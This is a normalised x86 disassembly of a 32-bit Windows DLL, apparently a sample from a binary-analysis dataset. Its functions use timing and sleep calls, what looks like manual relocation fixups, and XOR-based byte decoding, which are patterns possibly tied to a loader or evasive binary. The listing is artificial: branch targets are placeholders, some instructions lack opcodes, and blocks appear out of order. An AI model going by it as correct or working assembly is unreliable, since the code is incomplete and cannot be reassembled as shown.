mov [ ebp - 0x2c ] 0x208
mov [ ebp - 0x28 ] 0x6801
mov [ ebp - 0x24 ] 0x10
mov [ ebp - 0x20 ] 0x526278b5
mov [ ebp - 0x1c ] 0xd7243e98
mov [ ebp - 0x18 ] 0x7ceec63b
mov [ ebp - 0x14 ] 0x6291edb9
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
push edi
push esi
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x30 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x30 ]
cmp esi ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] ebx
call sub_1000b9e0
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x34 ]
cmp ecx ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
xor eax eax
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax 0x2
jmp r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_10056d20
push ebp
mov ebp esp
push 0xffffffff
push sub_1008922b
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
call [ GetCurrentThreadId@IAT ]
cmp [ esi + 0x374 ] eax
je r-xdata
cmp [ esi + 0xc ] 0x0
mov edi 0x1
je r-xdata
lea edx [ ebp - 0xc0 ]
mov eax 0x156
call sub_10069020
xor eax eax
mov [ ebp - 0xdc ] ax
mov eax edx
mov [ ebp - 0xc8 ] 0x7
mov [ ebp - 0xcc ] 0x0
lea edx [ eax + 0x2 ]
mov eax edi
cmp [ esi + 0x40 ] 0x0
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0xc0 ]
push ecx
lea ecx [ ebp - 0xdc ]
call sub_10034100
lea edx [ ebp - 0xdc ]
mov ecx 0x6
mov [ ebp - 0x4 ] 0x0
call sub_10022b50
cmp [ ebp - 0xc8 ] 0x8
jb r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x398 ]
push eax
call ecx
add esp 0x4
test eax eax
jne r-xdata
call sub_10023720
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0xdc ]
push edx
call sub_1000a86e
add esp 0x4
mov [ esi + 0xc ] 0x0
xor edi edi
xor edi edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10056e40
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0x10 ]
push edi
push eax
push ecx
call sub_1000a957
mov esi eax
add esp 0xc
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x10
call sub_1005b670
mov edx [ eax ]
mov eax [ ebp + 0x14 ]
mov [ eax ] edx
mov eax esi
sub_10056e80
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a070
mov eax [ fs : 0x0 ]
push eax
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ rw-data ]
cmp [ ebx + 0xb4 ] 0x10
mov eax [ ebp + 0x8 ]
mov esi [ ebx + 0xb0 ]
mov [ ebp - 0x128 ] ecx
lea ecx [ ebx + 0xa0 ]
mov [ ebp - 0x12c ] eax
mov [ ebp - 0x10c ] ebx
mov eax esi
jb r-xdata
push 0x0
push r--data
push ecx
call sub_100021f0
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ecx ]
sete al
test al al
je r-xdata
test esi esi
setne al
test eax eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax 0x44
jmp r-xdata
mov [ ebp - 0xf9 ] 0x0
mov eax 0x45
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov edi ebx
call sub_10023140
mov esi eax
xor eax eax
mov [ ebp - 0x108 ] esi
cmp esi eax
je r-xdata
mov eax [ ebx + 0xc4 ]
mov edx [ ebx + 0xc8 ]
sub edx eax
sar edx 0x2
test edx edx
je r-xdata
lea ecx [ ebp - 0xc0 ]
call sub_10003250
mov eax 0x43
jmp r-xdata
jmp r-xdata
mov ecx [ ebx + 0xc8 ]
mov esi [ ebx + 0xc4 ]
cmp esi ecx
je r-xdata
nop
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] eax
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x4 ] 0x1
call [ GetTickCount@IAT ]
lea edx [ ebp - 0xc0 ]
push edx
push esi
lea edx [ ebp - 0x124 ]
lea ecx [ ebx + 0xa0 ]
mov edi eax
call sub_1002a030
mov esi eax
mov [ ebp - 0x130 ] esi
call [ GetTickCount@IAT ]
sub eax edi
mov [ ebp - 0x110 ] eax
fild [ ebp - 0x110 ]
jns r-xdata
mov [ ebp - 0xf9 ] 0x0
mov eax ecx
sub eax ecx
sar eax 0x2
lea edi [ eax * 4 ]
push edi
push ecx
push esi
call sub_1007ec40
add esp 0xc
add esi edi
mov [ ebx + 0xc8 ] esi
mov eax [ ebx + 0xc4 ]
mov ecx [ ebx + 0xc8 ]
sub ecx eax
inc edi
sar ecx 0x2
cmp edi ecx
jb r-xdata
mov esi eax
call sub_10008740
fmul [ ebx + 0xfc ]
fnstcw [ ebp - 0xfe ]
movzx eax [ ebp - 0xfe ]
or eax 0xc00
mov [ ebp - 0x104 ] eax
fldcw [ ebp - 0x104 ]
fistp [ ebp - 0x114 ]
mov eax [ ebp - 0x114 ]
push eax
fldcw [ ebp - 0xfe ]
call [ Sleep@IAT ]
cmp esi 0x42
je r-xdata
fadd [ r--data ]
mov eax [ eax + edi * 4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x108 ]
mov [ ecx + 0xd4 ] 0x0
jmp r-xdata
cmp esi 0x43
je r-xdata
mov [ ebp - 0xf9 ] 0x1
mov edx [ ebp - 0x108 ]
mov [ edx + 0xd4 ] 0x0
mov eax [ ebp - 0x120 ]
xor edx edx
cmp esi edx
mov esi [ ebp - 0x124 ]
jne r-xdata
xor edi edi
push edi
push r--data
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0xac ] 0xf
mov [ ebp - 0xb0 ] edi
mov [ ebp - 0xc0 ] 0x0
call sub_1003e780
cmp [ ebp - 0xf9 ] 0x0
mov [ ebp - 0x4 ] edi
je r-xdata
sub eax esi
sar eax 0x5
mov [ ebp - 0x104 ] edx
mov [ ebp - 0x110 ] eax
cmp eax edx
jbe r-xdata
mov ecx eax
sub ecx esi
test ecx 0xffffffe0
je r-xdata
cmp [ ebp - 0xf9 ] 0x0
jne r-xdata
mov [ ebp - 0x100 ] esi
cmp [ ebp - 0xac ] 0x10
mov ecx [ ebp - 0xc0 ]
mov [ ebp - 0xb0 ] edx
jae r-xdata
lea esi [ ebp - 0x124 ]
call sub_10030c90
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10003250
jmp r-xdata
lea esi [ ebp - 0x124 ]
mov [ ebp - 0x4 ] 0x0
call sub_10030c90
cmp [ ebp - 0x130 ] 0x4
je r-xdata
mov eax [ ebp - 0x104 ]
inc eax
add esi 0x20
mov [ ebp - 0x104 ] eax
mov [ ebp - 0x100 ] esi
cmp eax [ ebp - 0x110 ]
jb r-xdata
mov edx esi
mov ecx ebx
call sub_1002b9c0
mov edi eax
test edi edi
js r-xdata
mov [ ecx ] dl
lea ecx [ ebp - 0xc0 ]
mov eax [ ebx + 0xc4 ]
mov ecx [ ebx + 0xc8 ]
sub ecx eax
xor edx edx
sar ecx 0x2
mov [ ebp - 0x100 ] edx
test ecx ecx
je r-xdata
mov esi [ ebp - 0x108 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov eax [ esi ]
push eax
lea esi [ ebp - 0x34 ]
call sub_10011ee0
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0x2
call sub_10004e10
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_10003250
mov ecx [ ebx + 0xc4 ]
add edi edi
add edi edi
mov eax [ ecx + edi ]
mov edx [ eax + 0x28 ]
cmp edx [ eax + 0x2c ]
jne r-xdata
lea ecx [ ebp - 0xc0 ]
call sub_10003250
xor eax eax
nop
mov esi [ ebp - 0x100 ]
push eax
lea esi [ ebp - 0x34 ]
call sub_10028530
mov edx [ ebp - 0x108 ]
lea ecx [ ebx + 0xa0 ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x3
call sub_10017d40
lea ecx [ ebp - 0x34 ]
mov esi eax
mov [ ebp - 0x4 ] 0x1
call sub_10003250
cmp esi 0x43
je r-xdata
mov ebx [ ebp - 0x10c ]
mov ecx [ ebx + 0xc4 ]
lea esi [ ebx + 0xc4 ]
lea edi [ edx * 4 ]
mov eax [ edi + ecx ]
mov ecx [ eax + 0x2c ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0x128 ]
push ecx
mov ecx [ ebp - 0x12c ]
push ebx
mov ebx eax
mov [ ebp - 0x104 ] esi
call sub_1004f2c0
lea edx [ ebp - 0x38 ]
mov eax 0x7
call sub_10071e30
mov eax [ esi ]
mov edx [ eax + edi ]
mov eax [ edx + 0x4 ]
push eax
lea eax [ ebp - 0xf8 ]
push eax
call sub_10057f20
push eax
lea edx [ ebp - 0x38 ]
lea esi [ ebp - 0xdc ]
mov [ ebp - 0x4 ] 0x6
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0xcf
mov [ ebp - 0x4 ] 0x7
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0xf8 ]
call sub_100702e0
mov ebx [ ebp - 0x104 ]
mov ecx [ ebx ]
mov esi [ edi + ecx ]
test esi esi
je r-xdata
push ecx
lea esi [ ebp - 0xdc ]
call sub_10028530
mov ecx [ ebp - 0x10c ]
mov edx [ ebp - 0x108 ]
add ecx 0xa0
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x8
call sub_1004bd50
lea ecx [ ebp - 0xdc ]
mov esi eax
mov [ ebp - 0x4 ] 0x0
call sub_10003250
cmp esi 0x43
je r-xdata
mov eax [ ebp - 0x108 ]
mov [ eax + 0xd4 ] 0x0
jmp r-xdata
lea edx [ ebp - 0xf8 ]
mov eax 0x18
call sub_10071e30
mov eax [ ebx + 0xc4 ]
mov ecx [ eax + edi ]
mov eax [ ecx + 0x4 ]
push eax
lea edx [ ebp - 0xdc ]
push edx
call sub_10057f20
push eax
lea edx [ ebp - 0xf8 ]
lea esi [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x4
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0xcf
mov [ ebp - 0x4 ] 0x5
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0xdc ]
mov [ ebp - 0x4 ] 0x1
call sub_100702e0
mov ebx [ ebx ]
mov esi [ ebp - 0x104 ]
add ebx edi
push ebx
lea edi [ ebp - 0x134 ]
call sub_100539c0
lea ecx [ ebp - 0xc0 ]
call sub_10003250
mov eax 0x1
jmp r-xdata
call sub_10008740
mov eax [ ebp - 0x108 ]
lea ecx [ ebp - 0xc0 ]
mov [ eax + 0xd4 ] 0x0
mov [ ebp - 0xf9 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
call sub_10003250
mov ebx [ ebp - 0x10c ]
jmp r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0x44
call sub_10071e30
mov eax [ ebx + 0xc4 ]
mov eax [ eax + edi ]
mov eax [ eax + 0x4 ]
push eax
lea ecx [ ebp - 0xf8 ]
push ecx
call sub_10057f20
push eax
lea edx [ ebp - 0xa4 ]
lea esi [ ebp - 0xdc ]
mov [ ebp - 0x4 ] 0x9
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0xcf
mov [ ebp - 0x4 ] 0xa
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0x4 ] 0x0
call sub_100702e0
mov edx [ ebx + 0xc4 ]
mov esi [ edi + edx ]
test esi esi
je r-xdata
mov eax [ ebx + 0xc4 ]
add eax edi
push eax
lea edi [ ebp - 0x134 ]
lea esi [ ebx + 0xc4 ]
call sub_100539c0
mov eax [ ebx + 0xc4 ]
mov edx [ ebx + 0xc8 ]
mov ecx [ ebp - 0x100 ]
sub edx eax
inc ecx
sar edx 0x2
mov [ ebp - 0x100 ] ecx
cmp ecx edx
jae r-xdata
call sub_10008740
mov edx ecx
jmp r-xdata
lea edi [ edx * 4 ]
mov ecx [ edi + eax ]
mov esi [ ecx + 0x28 ]
cmp esi [ ecx + 0x2c ]
je r-xdata
sub_10057520
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebx ]
push edi
xor edi edi
cmp esi edi
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ ebx ] eax
cmp eax edi
jne r-xdata
cmp [ esi + 0x4 ] edi
je r-xdata
mov esi eax
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ esi + 0x4 ] eax
mov esi eax
cmp esi edi
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] edi
jne r-xdata
xor ebx ebx
mov edx [ ebp + 0x8 ]
mov [ ebx ] edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0xc ] edi
mov [ ebx + 0x10 ] edi
mov [ ebx + 0x14 ] edi
mov [ ebx + 0x1c ] edi
mov [ ebx + 0x20 ] edi
call sub_10002e30
jmp r-xdata
push 0x24
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
cmp ebx edi
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
pop ebp
retn 0x4
mov [ esi + 0x4 ] edi
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov [ esi ] ebx
cmp ebx edi
je r-xdata
sub_100575f9
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10043be2
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_100576a0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x1fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10032538
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_10055e2a
lea eax [ ecx * 8 ]
push eax
call sub_1002e3ac
add esp 0x4
test eax eax
jne r-xdata
sub_10057700
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a1d8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov esi edx
xor ebx ebx
xor edx edx
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] dx
lea eax [ ebp - 0x30 ]
push eax
push esi
mov [ ebp - 0x4 ] ebx
call sub_10067db0
test eax eax
je r-xdata
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0xc ] ebx
je r-xdata
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov edx [ ebp - 0x6c ]
mov ecx [ ebp - 0x68 ]
push edx
lea eax [ ebp - 0x64 ]
push eax
lea edx [ ebp - 0x30 ]
call sub_10008d50
mov esi [ ebp - 0x64 ]
test eax eax
je r-xdata
xor edx edx
xor eax eax
mov [ ebp - 0x40 ] 0x7
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] dx
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x2
mov esi [ esi + 0x10 ]
mov eax esi
lea edx [ eax + 0x2 ]
mov edi edi
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1000a86e
add esp 0x4
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x54 ]
call sub_10034100
mov eax [ ebp + 0xc ]
mov [ ebp - 0x38 ] edi
lea ecx [ ebp - 0x54 ]
lea edi [ ebp - 0x64 ]
mov [ ebp - 0x34 ] eax
call sub_1006dc90
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x40 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0xc
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov edi [ ebp - 0x60 ]
mov eax esi
call sub_1006a100
push esi
call sub_1000a86e
add esp 0x4
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov edi [ ebp - 0x60 ]
mov eax esi
call sub_1006a100
push esi
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x54 ]
push ecx
call sub_1000a86e
add esp 0x4
xor eax eax
mov edx [ ebp - 0x30 ]
push edx
call sub_1000a86e
add esp 0x4
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1000a86e
add esp 0x4
sub_100578a0
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax edx
sub eax [ ecx + 0x34 ]
push ebx
mov ebx [ ecx + 0xa4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0xa0 ]
add eax edx
test ebx ebx
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
push edi
jmp r-xdata
mov esi [ eax ]
mov ecx [ eax + 0x4 ]
add esi edx
lea edx [ eax + 0x8 ]
sub ebx ecx
lea edi [ ecx - 0x8 ]
add eax ecx
xor ecx ecx
shr edi 0x1
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] ebx
je r-xdata
test ebx ebx
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
pop edi
pop esi
inc ecx
cmp ecx edi
jb r-xdata
movzx edx [ edx + ecx * 2 ]
and edx 0xfff
add [ edx + esi ] ebx
mov edx [ ebp - 0x8 ]
cmp [ edx + ecx * 2 ] 0x0
je r-xdata
mov ebx [ ebp - 0xc ]
sub_10057940
push ebp
mov ebp esp
mov edx [ rw-data ]
mov ecx [ edx + 0x10 ]
mov eax [ edx + 0xc ]
push esi
cmp eax ecx
je r-xdata
or eax 0xffffffff
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
cmp eax ecx
jne r-xdata
add eax 0x8
cmp eax ecx
jne r-xdata
mov ecx [ ebp + 0x10 ]
xor esi esi
cmp ecx esi
jne r-xdata
cmp [ eax ] esi
je r-xdata
cmp ecx 0x2
jne r-xdata
mov ecx [ edx + 0x4 ]
mov edx [ ebp + 0xc ]
cmp edx ecx
jae r-xdata
cmp ecx 0x1
jne r-xdata
mov ecx [ edx + 0x4 ]
mov edx [ ebp + 0xc ]
cmp edx ecx
jae r-xdata
mov [ eax + 0x4 ] ecx
mov eax ecx
pop esi
pop ebp
retn
mov [ eax + 0x4 ] edx
mov eax edx
pop esi
pop ebp
retn
xor eax eax
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
cmp ecx esi
jle r-xdata
mov [ eax + 0x4 ] esi
mov eax esi
pop esi
pop ebp
retn
sub ecx edx
mov edx [ eax + 0x4 ]
add edx ecx
je r-xdata
mov esi [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
add esi ecx
cmp esi edx
jae r-xdata
add [ eax + 0x4 ] ecx
mov eax [ eax + 0x4 ]
pop esi
pop ebp
retn
add [ eax + 0x4 ] ecx
mov eax [ eax + 0x4 ]
pop esi
pop ebp
retn
sub_100579de
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10038125
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_10057a30
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax + eax * 2 ]
lea esi [ esi * 4 + r--data ]
xor cl cl
cmp [ esi + 0x4 ] 0x0
jbe r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0xc ]
mov [ edx + ecx ] 0x0
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0xc ]
xor eax eax
nop
mov edx [ esi ]
mov dl [ edx + eax ]
xor dl [ esi + 0x8 ]
xor dl cl
inc cl
mov [ eax + edi ] dl
movzx eax cl
cmp eax [ esi + 0x4 ]
jb r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + eax ] 0x0
pop edi
pop esi
pop ebp
retn
sub_10057a7f
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10068140
add esp 0x14
pop ebp
retn 0x10
sub_10057aa0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088430
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x9249249
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ebx
jae r-xdata
push r--data
call sub_10030594
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edi [ esi + 0xc ]
push ebx
mov ecx edi
call sub_1005f570
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ebx
push 0x0
push edi
push eax
push ecx
push edx
mov [ ebp - 0x14 ] eax
call sub_100096d0
mov ebx [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add esp 0x18
add edi edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax * 8 ]
sub ecx eax
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
lea ecx [ edi * 8 ]
sub ecx edi
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov ecx [ ebp + 0x8 ]
push ecx
lea eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x4 ]
push eax
push ebx
call sub_1001feb0
mov edx [ esi ]
push edx
call sub_1000a86e
add esp 0x14
sub_10057bc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
push ebx
push eax
mov ecx edi
mov esi ebx
call sub_10053010
test eax eax
jne r-xdata
mov edx [ edi + 0x108 ]
mov eax [ edi + 0x100 ]
lea eax [ edx + eax + 0x7 ]
lea ecx [ eax + eax * 2 ]
add ecx [ edi + 0x50 ]
mov eax esi
sub eax ebx
cmp eax ecx
jae r-xdata
lea ebx [ ebx ]
lea ebx [ esi - 0x1 ]
lea edx [ ebx - 0x5 ]
mov ecx eax
mov [ ebp - 0x4 ] ecx
cmp eax edx
jb r-xdata
mov eax ecx
mov ecx [ ebp + 0x8 ]
add esi ebx
push esi
push ecx
mov ecx edi
call sub_10053010
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea esi [ ecx + ebx ]
shr esi 0x1
push esi
push eax
mov ecx edi
call sub_10053010
test eax eax
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x4 ] esi
cmp eax 0x2
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ebx [ esi - 0x1 ]
jmp r-xdata
lea ecx [ ebx - 0x5 ]
cmp [ ebp - 0x4 ] ecx
jb r-xdata
sub_10057c68
push 0x10
mov eax sub_10085553
call sub_10026266
mov edi ecx
mov ecx [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10007a10
and [ ebp - 0x4 ] 0x0
push eax
call sub_1005d0f3
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
call sub_1002be90
mov esi [ ebp + 0x28 ]
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x25
jne r-xdata
mov esi [ ebp + 0x20 ]
cmp al 0x20
jne r-xdata
push 0x0
mov eax [ edi ]
inc esi
movzx ecx [ esi ]
push ecx
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x1c ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x1c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10008d33
retn 0x24
or [ esi ] 0x1
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
jne r-xdata
inc esi
movzx ebx [ ebp + 0x12 ]
lea eax [ edi + 0x14 ]
push eax
movzx eax [ esi ]
push 0x0
push eax
call sub_10032181
add esp 0xc
cmp bx ax
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_100255aa
mov ebx [ ebp - 0x14 ]
